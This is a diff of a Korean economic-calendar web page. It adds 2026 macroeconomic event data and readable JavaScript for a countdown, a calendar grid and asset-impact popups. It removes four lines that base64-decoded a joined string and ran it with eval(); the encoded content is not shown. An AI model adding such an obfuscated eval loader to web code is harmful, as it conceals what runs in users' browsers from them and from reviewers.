+  {date:'2026-04-09',time:'23:30',country:'us',title:'EIA 원유 재고',prev:'+5.5M',forecast:'',actual:'',impact:'',guide:'eia_oil'},
+  {date:'2026-04-10',time:'08:00',country:'cn',title:'무역수지 (3월)',prev:'170.5B',forecast:'160.0B',actual:'',impact:'',guide:'cn_trade'},
+  {date:'2026-04-10',time:'21:30',country:'us',title:'신규 실업수당 청구',prev:'223K',forecast:'225K',actual:'',impact:'',guide:'jobless'},
+  {date:'2026-04-14',time:'21:30',country:'us',title:'소매판매 (3월)',prev:'0.2%',forecast:'0.4%',actual:'',impact:'',guide:'retail'},
+  {date:'2026-04-15',time:'10:00',country:'cn',title:'GDP 성장률 Q1 2026',prev:'5.4%',forecast:'4.8%',actual:'',impact:'',guide:'cn_gdp'},
+  {date:'2026-04-15',time:'10:00',country:'cn',title:'산업생산 (3월)',prev:'5.9%',forecast:'5.5%',actual:'',impact:'',guide:'cn_gdp'},
+  {date:'2026-04-15',time:'10:00',country:'cn',title:'소매판매 (3월)',prev:'4.0%',forecast:'4.2%',actual:'',impact:'',guide:'cn_gdp'},
+  {date:'2026-04-16',time:'10:00',country:'kr',title:'한국은행 기준금리 결정',prev:'2.75%',forecast:'2.50%',actual:'',impact:'',guide:'bok_rate'},
+  {date:'2026-04-16',time:'23:30',country:'us',title:'EIA 원유 재고',prev:'',forecast:'',actual:'',impact:'',guide:'eia_oil'},
+  {date:'2026-04-17',time:'21:30',country:'us',title:'신규 실업수당 청구',prev:'223K',forecast:'225K',actual:'',impact:'',guide:'jobless'},
+  {date:'2026-04-17',time:'21:30',country:'us',title:'주택착공건수 (3월)',prev:'1.501M',forecast:'1.480M',actual:'',impact:'',guide:'housing'},
+  {date:'2026-04-28',time:'12:00',country:'jp',title:'BOJ 기준금리 결정',prev:'0.50%',forecast:'0.75%',actual:'',impact:'',guide:'boj_rate'},
+  {date:'2026-04-23',time:'21:30',country:'us',title:'신규 실업수당 청구',prev:'',forecast:'',actual:'',impact:'',guide:'jobless'},
+  {date:'2026-04-23',time:'22:45',country:'us',title:'S&P PMI 제조업 예비',prev:'52.7',forecast:'52.5',actual:'',impact:'',guide:'sp_pmi'},
+  {date:'2026-04-24',time:'21:30',country:'us',title:'내구재 주문 (3월)',prev:'-1.0%',forecast:'0.8%',actual:'',impact:'',guide:'durable'},
+  {date:'2026-04-25',time:'21:30',country:'us',title:'GDP Q1 속보',prev:'2.4%',forecast:'1.2%',actual:'',impact:'',guide:'gdp'},
+  {date:'2026-04-25',time:'21:30',country:'us',title:'PCE 물가지수 (3월)',prev:'2.5%',forecast:'2.4%',actual:'',impact:'',guide:'pce'},
+  {date:'2026-04-29',time:'10:00',country:'cn',title:'제조업 PMI (4월)',prev:'50.5',forecast:'50.3',actual:'',impact:'',guide:'cn_pmi'},
+  {date:'2026-04-30',time:'03:00',country:'us',title:'FOMC 기준금리 결정',prev:'4.25~4.50%',forecast:'4.25~4.50%',actual:'',impact:'',guide:'fomc'},
+  // ════════ 2026년 5월 ════════
+  {date:'2026-05-01',time:'21:30',country:'us',title:'비농업 취업자수 NFP (4월)',prev:'228K',forecast:'180K',actual:'',impact:'',guide:'nfp'},
+  {date:'2026-05-13',time:'21:30',country:'us',title:'소비자물가 CPI (4월)',prev:'',forecast:'',actual:'',impact:'',guide:'cpi'},
+  {date:'2026-05-15',time:'10:00',country:'cn',title:'GDP·산업생산 발표',prev:'',forecast:'',actual:'',impact:'',guide:'cn_gdp'},
 ];
-var _e_=_c_.join('');
-var _b_=Uint8Array.from(atob(_e_),function(c){return c.charCodeAt(0)});
-var _d_=new TextDecoder('utf-8').decode(_b_);
-eval(_d_);
+
+// ─── 공통 변수 ───
+var CTRY_FLAG={us:'🇺🇸',cn:'🇨🇳',kr:'🇰🇷',jp:'🇯🇵'};
+var CTRY_NAME={us:'🇺🇸 미국',cn:'🇨🇳 중국',kr:'🇰🇷 한국',jp:'🇯🇵 일본'};
+var MONTH_KO=['1월','2월','3월','4월','5월','6월','7월','8월','9월','10월','11월','12월'];
+var DOW_KO=['일','월','화','수','목','금','토'];
+var calYear=2026, calMonth=3;
+var cdInterval=null;
+
+// ─── 카운트다운 ───
+function getNextEvent(){
+  var now=new Date();
+  var list=CAL_EVENTS.filter(function(e){
+    if(e.actual) return false;
+    var p=e.date.split('-'),t=e.time.split(':');
+    return new Date(+p[0],+p[1]-1,+p[2],+t[0],+t[1],0)>now;
+  });
+  if(!list.length) return null;
+  list.sort(function(a,b){
+    function D(x){var p=x.date.split('-'),t=x.time.split(':');return new Date(+p[0],+p[1]-1,+p[2],+t[0],+t[1],0);}
+    return D(a)-D(b);
+  });
+  return list[0];
+}
+
+function updateCountdown(){
+  var ev=getNextEvent();
+  var set=function(id,v){var el=document.getElementById(id);if(el)el.textContent=v;};
+  if(!ev){set('cdTitle','예정된 이벤트 없음');return;}
+  var p=ev.date.split('-'),t=ev.time.split(':');
+  var diff=Math.max(0,Math.floor((new Date(+p[0],+p[1]-1,+p[2],+t[0],+t[1],0)-new Date())/1000));
+  var pad=function(n){return n<10?'0'+n:''+n;};
+  set('cdTitle',ev.title);
+  set('cdMeta',(CTRY_FLAG[ev.country]||'')+' '+ev.date+' '+ev.time+' KST');
+  var _g=ev.guide?EVENT_GUIDES[ev.guide]:null;
+  set('cdDesc',_g&&_g.desc?_g.desc:'');
+  set('cdD',Math.floor(diff/86400));
+  set('cdH',pad(Math.floor((diff%86400)/3600)));
+  set('cdM',pad(Math.floor((diff%3600)/60)));
+  set('cdS',pad(diff%60));
+}
+
+function startCountdown(){
+  updateCountdown();
+  if(cdInterval) clearInterval(cdInterval);
+  cdInterval=setInterval(updateCountdown,1000);
+}
+
+// ─── 캘린더 렌더링 ───
+function calPrev(){calMonth--;if(calMonth<0){calMonth=11;calYear--;}renderCalendar();}
+function calNext(){calMonth++;if(calMonth>11){calMonth=0;calYear++;}renderCalendar();}
+
+function renderCalendar(){
+  var lbl=document.getElementById('calMonthLabel');
+  if(lbl) lbl.textContent=calYear+'년 '+MONTH_KO[calMonth];
+  renderCalGrid();
+  renderCalSummary();
+}
+
+function renderCalSummary(){
+  var list=document.getElementById('calSummaryList');
+  if(!list) return;
+  var evs=CAL_EVENTS.filter(function(e){
+    var d=new Date(e.date);
+    return d.getFullYear()===calYear&&d.getMonth()===calMonth;
+  });
+  if(!evs.length){list.innerHTML='<div style="font-size:13px;color:var(--text2)">이달 등록된 지표가 없습니다.</div>';return;}
+  var html='';
+  evs.forEach(function(e){
+    var d=new Date(e.date);
+    var done=e.actual?'<span style="color:#00c896;font-size:10px"> ✓</span>':'';
+    html+='<div class="cal-summary-item">'
+        +'<span class="cal-summary-day">'+(d.getMonth()+1)+'/'+(d.getDate())+'</span>'
+        +'<span class="cal-summary-time">'+e.time+' KST</span>'
+        +'<span class="cal-summary-text">'+(CTRY_FLAG[e.country]||'')+' '+e.title+done+'</span>'
+        +'</div>';
+  });
+  list.innerHTML=html;
+}
+
+function renderCalGrid(){
+  var grid=document.getElementById('calGrid');
+  if(!grid) return;
+  var html='';
+  DOW_KO.forEach(function(d){html+='<div class="cal-dow">'+d+'</div>';});
+  var firstDay=new Date(calYear,calMonth,1).getDay();
+  var lastDate=new Date(calYear,calMonth+1,0).getDate();
+  var prevLast=new Date(calYear,calMonth,0).getDate();
+  var today=new Date();
+  for(var i=0;i<firstDay;i++)
+    html+='<div class="cal-cell other-month"><div class="cal-date">'+(prevLast-firstDay+1+i)+'</div></div>';
+  for(var d=1;d<=lastDate;d++){
+    var isToday=(today.getFullYear()===calYear&&today.getMonth()===calMonth&&today.getDate()===d);
+    var dow=new Date(calYear,calMonth,d).getDay();
+    var cls='cal-cell'+(isToday?' today':'')+(dow===0||dow===6?' weekend':'');
+    var mm=(calMonth+1<10?'0':'')+(calMonth+1), dd=(d<10?'0':'')+d;
+    var ds=calYear+'-'+mm+'-'+dd;
+    var dayEvs=CAL_EVENTS.filter(function(e){return e.date===ds;});
+    html+='<div class="'+cls+'"><div class="cal-date">'+d+'</div><div class="cal-events">';
+    dayEvs.forEach(function(e,idx){
+      if(idx===3){html+='<div class="cal-event more">+'+(dayEvs.length-3)+'건</div>';return;}
+      if(idx>3) return;
+      var mark=e.actual?' ✓':'';
+      html+='<div class="cal-event '+e.country+'" onclick=\'showCalPopup('+JSON.stringify(JSON.stringify(e))+')\'>'+e.title.slice(0,13)+mark+'</div>';
+    });
+    html+='</div></div>';
+  }
+  var rem=(7-(firstDay+lastDate)%7)%7;
+  for(var j=1;j<=rem;j++)
+    html+='<div class="cal-cell other-month"><div class="cal-date">'+j+'</div></div>';
+  grid.innerHTML=html;
+}
+
+// ─── 팝업 (자산 영향 가이드 포함) ───
+function showCalPopup(jsonStr){
+  var e=JSON.parse(jsonStr);
+  var set=function(id,v){var el=document.getElementById(id);if(el)el.textContent=v;};
+  set('popDate',e.date);
+  set('popTitle',e.title);
+  set('popImportance','★★★');
+  set('popTime',(e.time||'—')+' KST');
+  set('popPrev',e.prev||'—');
+  set('popForecast',e.forecast||'—');
+  // 국가 뱃지
+  var cEl=document.getElementById('popCountry');
+  if(cEl){cEl.textContent=CTRY_NAME[e.country]||e.country;cEl.className='cal-popup-country '+(e.country||'');}
+  // 실제값 (발표 후만 표시)
+  var actRow=document.getElementById('popActualRow');
+  var actEl=document.getElementById('popActual');
+  if(actRow&&actEl){
+    actRow.style.display=e.actual?'':'none';
+    actEl.textContent=e.actual||'';
+  }
+  // 시장 반응 (발표 후만 표시)
+  var impRow=document.getElementById('popImpactRow');
+  if(impRow){
+    impRow.style.display=e.impact?'':'none';
+    set('popImpact',e.impact||'');
+  }
+  // 자산 영향 가이드
+  var gWrap=document.getElementById('popGuideWrap');
+  var gTable=document.getElementById('popGuideTable');
+  var gNote=document.getElementById('popGuideNote');
+  var guide=e.guide?EVENT_GUIDES[e.guide]:null;
+  if(gWrap&&guide){
+    gWrap.style.display='';
+    if(gTable){
+      var rows='';
+      guide.assets.forEach(function(a){
+        rows+='<tr><td>'+a.name+'</td><td>'+a.up+'</td><td>'+a.down+'</td></tr>';
+      });
+      gTable.innerHTML=rows;
+    }
+    if(gNote) gNote.textContent=guide.note||'';
+  } else if(gWrap){
+    gWrap.style.display='none';
+  }
+  document.getElementById('calPopup').classList.add('show');
+  document.getElementById('calOverlay').classList.add('show');
+}
+
+function closeCalPopup(){
+  document.getElementById('calPopup').classList.remove('show');
+  document.getElementById('calOverlay').classList.remove('show');
+}
+
 </script>
 </body>
 </html>
